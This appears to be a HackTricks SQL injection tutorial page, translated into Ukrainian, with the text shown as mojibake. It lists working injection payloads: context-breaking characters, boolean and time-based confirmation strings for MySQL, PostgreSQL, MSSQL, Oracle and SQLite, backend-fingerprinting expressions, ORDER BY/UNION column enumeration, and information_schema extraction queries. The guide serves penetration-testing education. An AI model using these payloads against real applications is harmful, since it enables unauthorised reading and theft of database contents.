# SQL Injection

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –ü—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks**? –∞–±–æ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–±—ñ–ª—å—à –≤–∞–∂–ª–∏–≤–æ—é –ø–æ–¥—ñ—î—é –∑ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó –º–µ—Ç–æ—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≤–∞–∂–ª–∏–≤–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É –≥–∞–ª—É–∑—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ —É –±—É–¥—å-—è–∫—ñ–π –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω—ñ.

{% embed url="https://www.rootedcon.com/" %}

## –©–æ —Ç–∞–∫–µ SQL —ñ–Ω'—î–∫—Ü—ñ—è?

**SQL —ñ–Ω'—î–∫—Ü—ñ—è** - —Ü–µ —É—Ä–∞–∑–∞ –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–≤—Ç—Ä—É—á–∞—Ç–∏—Å—è –≤ –∑–∞–ø–∏—Ç–∏ –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö** –¥–æ–¥–∞—Ç–∫–∞. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏**, **–∑–º—ñ–Ω—é–≤–∞—Ç–∏** –∞–±–æ **–≤–∏–¥–∞–ª—è—Ç–∏** –¥–∞–Ω—ñ, –¥–æ —è–∫–∏—Ö –≤–æ–Ω–∏ –Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –≤–∫–ª—é—á–∞—é—á–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –±—É–¥—å-—è–∫—ñ –¥–∞–Ω—ñ, –¥–æ —è–∫–∏—Ö –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ–¥–∞—Ç–æ–∫. –¢–∞–∫—ñ –¥—ñ—ó –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ—Å—Ç—ñ–π–Ω–∏—Ö –∑–º—ñ–Ω —É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ –∞–±–æ –≤–º—ñ—Å—Ç—ñ –¥–æ–¥–∞—Ç–∫–∞ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –¥–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —Å–µ—Ä–≤–µ—Ä–∞ –∞–±–æ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ.


## –í–∏—è–≤–ª–µ–Ω–Ω—è —Ç–æ—á–∫–∏ –≤—Ö–æ–¥—É

–ö–æ–ª–∏ —Å–∞–π—Ç –∑–¥–∞—î—Ç—å—Å—è **–≤—Ä–∞–∑–ª–∏–≤–∏–º –Ω–∞ SQL —ñ–Ω'—î–∫—Ü—ñ—é (SQLi)** —á–µ—Ä–µ–∑ –Ω–µ–∑–≤–∏—á–∞–π–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –≤–≤–µ–¥–µ–Ω–Ω—è, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ SQLi, **–ø–µ—Ä—à–∏–º –∫—Ä–æ–∫–æ–º** —î —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–∞–Ω—ñ –≤ –∑–∞–ø–∏—Ç –±–µ–∑ –π–æ–≥–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è**. –¶–µ –≤–∏–º–∞–≥–∞—î —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –º–µ—Ç–æ–¥—É **–≤–∏—Ö–æ–¥—É –∑ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É** –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ.
–û—Å—å –¥–µ—è–∫—ñ –∫–æ—Ä–∏—Å–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
–ü–æ—Ç—ñ–º –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏, —è–∫ **–≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç, —â–æ–± –Ω–µ –±—É–ª–æ –ø–æ–º–∏–ª–æ–∫**. –©–æ–± –≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–≤–µ—Å—Ç–∏** –¥–∞–Ω—ñ, —â–æ–± **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç –ø—Ä–∏–π–Ω—è–≤ –Ω–æ–≤—ñ –¥–∞–Ω—ñ**, –∞–±–æ –ø—Ä–æ—Å—Ç–æ **–≤–≤–µ—Å—Ç–∏** —Å–≤–æ—ó –¥–∞–Ω—ñ —Ç–∞ **–¥–æ–¥–∞—Ç–∏ —Å–∏–º–≤–æ–ª –∫–æ–º–µ–Ω—Ç–∞—Ä—è –≤ –∫—ñ–Ω—Ü—ñ**.

_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–º—ñ—Ç–∏—Ç–∏ —Ä—ñ–∑–Ω–∏—Ü—é, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç –ø—Ä–∞—Ü—é—î —ñ –∫–æ–ª–∏ –Ω—ñ, —Ü—è —Ñ–∞–∑–∞ –±—É–¥–µ –ø—Ä–æ—Å—Ç—ñ—à–æ—é._

### **–ö–æ–º–µ–Ω—Ç–∞—Ä—ñ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ª–æ–≥—ñ—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π

–ù–∞–¥—ñ–π–Ω–∏–π –º–µ—Ç–æ–¥ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó –≤–∫–ª—é—á–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–ª–æ–≥—ñ—á–Ω–æ—ó –æ–ø–µ—Ä–∞—Ü—ñ—ó** —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è –∑–∞ –æ—á—ñ–∫—É–≤–∞–Ω–∏–º–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–∞—Ä–∞–º–µ—Ç—Ä GET, —Ç–∞–∫–∏–π —è–∫ `?username=Peter`, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–π –≤–º—ñ—Å—Ç –ø—Ä–∏ –∑–º—ñ–Ω—ñ –Ω–∞ `?username=Peter' –∞–±–æ '1'='1`, —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó.

–¢–∞–∫ —Å–∞–º–æ, –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è **–º–∞—Ç–µ–º–∞—Ç–∏—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π** —Å–ª—É–≥—É—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–º –º–µ—Ç–æ–¥–æ–º –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –¥–æ—Å—Ç—É–ø –¥–æ `?id=1` —Ç–∞ `?id=2-1` –≤–∏–¥–∞—î –æ–¥–Ω–∞–∫–æ–≤–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç, —Ü–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å SQL-—ñ–Ω'—î–∫—Ü—ñ—ó.

–ü—Ä–∏–∫–ª–∞–¥–∏, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ª–æ–≥—ñ—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
–¶–µ–π —Å–ª–æ–≤–Ω–∏–∫ –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –¥–ª—è —Å–ø—Ä–æ–±–∏ **–ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó** –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–∞—Å—É

–£ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ **–Ω–µ –ø–æ–º—ñ—Ç–∏—Ç–µ –∂–æ–¥–Ω–∏—Ö –∑–º—ñ–Ω** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —è–∫—É –≤–∏ —Ç–µ—Å—Ç—É—î—Ç–µ. –¢–æ–º—É —Ö–æ—Ä–æ—à–∏–º —Å–ø–æ—Å–æ–±–æ–º **–≤–∏—è–≤–ª–µ–Ω–Ω—è —Å–ª—ñ–ø–∏—Ö SQL-—ñ–Ω'—î–∫—Ü—ñ–π** —î –∑–º—É—à–µ–Ω–Ω—è –ë–î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥—ñ—ó, —è–∫—ñ –≤–ø–ª–∏–≤–∞—é—Ç—å –Ω–∞ **—á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏**.\
–û—Ç–∂–µ, –º–∏ –±—É–¥–µ–º–æ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞—Ç–∏ –≤ SQL-–∑–∞–ø–∏—Ç –æ–ø–µ—Ä–∞—Ü—ñ—é, —è–∫–∞ –∑–∞–π–º–µ –±–∞–≥–∞—Ç–æ —á–∞—Å—É –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
–£ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö **—Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞—Ç—Ä–∏–º–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω—ñ**. –¢–æ–¥—ñ, –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞–ø–∏—Ç, —â–æ **–≤–∏–∫–æ–Ω—É—î —Å–∫–ª–∞–¥–Ω—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó**, —è–∫—ñ –∑–∞–π–º—É—Ç—å –∫—ñ–ª—å–∫–∞ —Å–µ–∫—É–Ω–¥. _–ü—Ä–∏–∫–ª–∞–¥–∏ —Ü–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –±—É–¥—É—Ç—å –æ–∫—Ä–µ–º–æ –ø—Ä–æ–∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω—ñ –¥–ª—è –∫–æ–∂–Ω–æ—ó —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó (—è–∫—â–æ —î —Ç–∞–∫—ñ)_.

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è Back-end

–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ back-end - —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó —Ä—ñ–∑–Ω–∏—Ö back-end. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ _**—Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞—Ç—Ä–∏–º–∫–∏**_ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É –∞–±–æ —Ü—ñ (—Ç–∞–±–ª–∏—Ü—è –∑ [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
–¢–∞–∫–æ–∂, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤ –∑–∞–ø–∏—Ç—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ **–≤–∏–≤–µ—Å—Ç–∏ –≤–µ—Ä—Å—ñ—é –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**.

{% hint style="info" %}
–ü—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º –±—É–¥–µ –æ–±–≥–æ–≤–æ—Ä–µ–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö –º–µ—Ç–æ–¥—ñ–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö –≤–∏–¥—ñ–≤ SQL Injection. –ú–∏ –±—É–¥–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ MySQL —è–∫ –ø—Ä–∏–∫–ª–∞–¥.
{% endhint %}

### –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑ PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Union Based

### –í–∏—è–≤–ª–µ–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å—Ç–æ–≤–ø—Ü—ñ–≤

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∑–∞–ø–∏—Ç—É, —Ü–µ –Ω–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.\
–ü–æ-–ø–µ—Ä—à–µ, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑'—è—Å—É–≤–∞—Ç–∏ **–∫—ñ–ª—å–∫—ñ—Å—Ç—å** **—Å—Ç–æ–≤–ø—Ü—ñ–≤**, —è–∫—É **–ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç** –ø–æ–≤–µ—Ä—Ç–∞—î. –¶–µ —Ç–æ–º—É, —â–æ **–æ–±–∏–¥–≤–∞ –∑–∞–ø–∏—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤**.\
–î–ª—è —Ü—å–æ–≥–æ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–≤–∞ –º–µ—Ç–æ–¥–∏:

#### Order/Group by

–©–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤ —É –∑–∞–ø–∏—Ç—ñ, –ø–æ—Å—Ç—É–ø–æ–≤–æ –∑–±—ñ–ª—å—à—É–π—Ç–µ —á–∏—Å–ª–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–µ –≤ –∫–ª–æ–∑—ñ **ORDER BY** –∞–±–æ **GROUP BY**, –ø–æ–∫–∏ –Ω–µ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –≤—ñ–¥–ø–æ–≤—ñ–¥—å. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –≤—ñ–¥–º—ñ–Ω–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ **GROUP BY** —Ç–∞ **ORDER BY** –≤ –º–µ–∂–∞—Ö SQL, –æ–±–∏–¥–≤–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –æ–¥–Ω–∞–∫–æ–≤–æ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å—Ç–æ–≤–ø—Ü—ñ–≤ —É –∑–∞–ø–∏—Ç—ñ.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

–í–∏–±–µ—Ä—ñ—Ç—å –±—ñ–ª—å—à–µ —Ç–∞ –±—ñ–ª—å—à–µ –Ω—É–ª—å–æ–≤–∏—Ö –∑–Ω–∞—á–µ–Ω—å, –ø–æ–∫–∏ –∑–∞–ø–∏—Ç –Ω–µ –±—É–¥–µ –≤—ñ—Ä–Ω–∏–º:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_–í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `null`, –æ—Å–∫—ñ–ª—å–∫–∏ –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö —Ç–∏–ø–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤ –∑ –æ–±–æ—Ö —Å—Ç–æ—Ä—ñ–Ω –∑–∞–ø–∏—Ç—É –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏, —ñ `null` —î –¥–æ–ø—É—Å—Ç–∏–º–∏–º —É –∫–æ–∂–Ω–æ–º—É –≤–∏–ø–∞–¥–∫—É._

### –í–∏–¥–æ–±—É—Ç–æ–∫ –Ω–∞–∑–≤ –±–∞–∑ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤ —Ç–∞–±–ª–∏—Ü—å —Ç–∞ –Ω–∞–∑–≤ —Å—Ç–æ–≤–ø—Ü—ñ–≤

–ù–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –º–∏ –∑–±–∏—Ä–∞—î–º–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–∞–∑–≤—É –≤—Å—ñ—Ö –±–∞–∑ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤—É —Ç–∞–±–ª–∏—Ü—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤ —Ç–∞–±–ª–∏—Ü—ñ:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_–Ü—Å–Ω—É—î —Ä—ñ–∑–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ü–∏—Ö –¥–∞–Ω–∏—Ö –≤ –∫–æ–∂–Ω—ñ–π —Ä—ñ–∑–Ω—ñ–π –±–∞–∑—ñ –¥–∞–Ω–∏—Ö, –∞–ª–µ –º–µ—Ç–æ–¥–∏–∫–∞ –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∞._

